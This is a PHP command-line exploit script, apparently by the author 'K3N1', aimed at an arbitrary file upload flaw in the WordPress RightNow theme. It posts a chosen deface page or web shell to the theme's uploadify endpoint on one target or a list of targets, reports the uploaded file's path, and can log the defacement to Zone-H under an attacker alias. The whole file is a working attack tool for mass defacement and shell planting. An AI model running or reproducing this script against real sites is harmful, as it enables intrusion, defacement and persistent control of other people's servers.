<?php 
	/*
	*	By João Artur (K3N1)
	*	www.github.com/JoaoArtur
	*	RightNow Theme Arbitrary File Upload
	*	php rn-theme.php -h
	*/

	error_reporting(0);
	$figlet = "\e[31m\e[1m                 _  _______ _   _ _
                | |/ /___ /| \ | / |
                | ' /  |_ \|  \| | |
                | . \ ___) | |\  | |
                |_|\_\____/|_| \_|_|
        \e[32mRightNow Theme Arbitrary File Upload
                   \e[0m\e[1m[\e[33m WordPress \e[0m\e[1m]";
	if (isset($argv)) {
		if (count($argv) == 2) {
			switch ($argv[1]) {
				case '-h':
					print $figlet;
					print "\n\n\e[0m\e[1m     --> -h \e[0m\e[1m[\e[33m AJUDA \e[0m\e[1m]\e[0m";
					//print "\n\e[0m\e[1m     --> -l lista.txt \e[0m\e[1m[\e[33m LISTA DE SITES (argumento 1) \e[0m\e[1m]\e[0m";
					print "\n\e[0m\e[1m     --> -u http://site.com/ \e[0m\e[1m[\e[33m SITE (argumento 1) \e[0m\e[1m]\e[0m";
					print "\n\e[0m\e[1m     --> -f deface.html \e[0m\e[1m[\e[33m Index File / Shell (argumento 2) \e[0m\e[1m]\e[0m";
					print "\n\e[0m\e[1m     --> -z K3N1 \e[0m\e[1m[\e[33m Zone-H (OPCIONAL argumento 3) \e[0m\e[1m]\e[0m";
					print "\n\n\e[0m\e[1mphp ".$argv[0]." -u http://site.com/ -f deface.html -z K3N1 \e[0m\e[1m[\e[33m Exemplo \e[0m\e[1m]\e[0m";
					//print "\n\e[0m\e[1mphp ".$argv[0]." -l lista.txt -f deface.html -z K3N1 \e[0m\e[1m[\e[33m Exemplo \e[0m\e[1m]\e[0m";
					break;
				
				default:
					print "Ajuda";
					break;
			}
		} elseif (count($argv) > 2) {
			if (count($argv) > 5 || count($argv) == 5) {
				if ($argv[1] == "-l" || $argv[1] == "-u") {
					if ($argv[1] == "-l") {
						$lista = $argv[2];
						if (file_exists($lista)) {
							$lista = explode("\n",file_get_contents($lista));
							if ($argv[3] == "-f") {
								$arquivo = $argv[4];
								if (file_exists($arquivo)) {
									print $figlet;
									foreach ($lista as $site) {
										$ch = curl_init($site."/wp-content/themes/RightNow/includes/uploadify/upload_settings_image.php");
										curl_setopt($ch, CURLOPT_POST, true);
										$uparq = $argv[4];
										curl_setopt($ch, CURLOPT_POSTFIELDS, array('Filedata'=>"@$uparq"));
										curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
										$retorno = curl_exec($ch);
										curl_close($ch);

										$r = json_decode($retorno,true);
										if ($r['status'] == "OK") {
											$sv = str_replace("//", "/", $site."/wp-content/uploads/settingsimages/".$arquivo);
											if (count($argv) == 7) {
												$atacante = $argv[6];
												$zone = curl_init($site."/wp-content/themes/RightNow/includes/uploadify/upload_settings_image.php");
												curl_setopt($zone, CURLOPT_POST, true);
												curl_setopt($zone, CURLOPT_POSTFIELDS, array('defacer'=>$atacante,'domain1'=>$sv,'hackmode'=>'30','reason'=>'30'));
												$z = curl_exec($zone);
												curl_close($zone);
												print "\n\n\e[0m\e[1m[\e[33m OK \e[0m\e[1m]\e[0m\e[32m\e[1m $sv \e[0m\e[1m[\e[33m Zone-H: Ok \e[0m\e[1m]\e[0m";
											} else {
											print "\n\n\e[0m\e[1m[\e[33m OK \e[0m\e[1m]\e[0m\e[32m\e[1m $sv \e[0m";
											}
										} else {
											print "\n\n\e[31m\e[1m     --> ERRO \e[31mNao foi dessa vez :(\e[0m";
										}
									}
								} else {
									print "\n\n\e[31m\e[1m     --> ERRO \e[31mShell ou deface nao encontrada\e[0m";
								}
							}
						} else {
							print $figlet."\n\n\e[31m\e[1m     --> ERRO \e[31mArquivo da lista nao existe\e[0m";
						}
					} elseif ($argv[1] == "-u") {
						$site = $argv[2];
						if ($argv[3] == "-f") {
							$arquivo = $argv[4];
							if (file_exists($arquivo)) {
								print $figlet;
								$ch = curl_init($site."/wp-content/themes/RightNow/includes/uploadify/upload_settings_image.php");
								curl_setopt($ch, CURLOPT_POST, true);
								$uparq = $argv[4];
								curl_setopt($ch, CURLOPT_POSTFIELDS, array('Filedata'=>"@$uparq"));
								curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
								$retorno = curl_exec($ch);
								curl_close($ch);

								$r = json_decode($retorno,true);
								if ($r['status'] == "OK") {
									$sv = str_replace("//", "/", $site."/wp-content/uploads/settingsimages/".$arquivo);
									if (count($argv) == 7) {
										$atacante = $argv[6];
										$zone = curl_init($site."/wp-content/themes/RightNow/includes/uploadify/upload_settings_image.php");
										curl_setopt($zone, CURLOPT_POST, true);
										curl_setopt($zone, CURLOPT_POSTFIELDS, array('defacer'=>$atacante,'domain1'=>$sv,'hackmode'=>'30','reason'=>'30'));
										$z = curl_exec($zone);
										curl_close($zone);
										print "\n\n\e[0m\e[1m[\e[33m OK \e[0m\e[1m]\e[0m\e[32m\e[1m $sv \e[0m\e[1m[\e[33m Zone-H: Ok \e[0m\e[1m]\e[0m";
									} else {
									print "\n\n\e[0m\e[1m[\e[33m OK \e[0m\e[1m]\e[0m\e[32m\e[1m $sv \e[0m";
									}
								} else {
									print $figlet."\n\n\e[31m\e[1m     --> ERRO \e[31mNao foi dessa vez :(\e[0m";
								}
							} else {
								print $figlet."\n\n\e[31m\e[1m     --> ERRO \e[31mShell ou deface nao encontrada\e[0m";
							}
						}
					}
				} else {
					print $figlet."\n\n\e[31m\e[1m     --> ERRO \e[31mO primeiro argumento deve ser -l ou -u\e[0m";
				}
			}
		} elseif (count($argv) == 1) {
			print $figlet."\n\n\e[0m\e[1m            --> php ".$argv[0]." -h <--\e[0m";
		}
	}
?>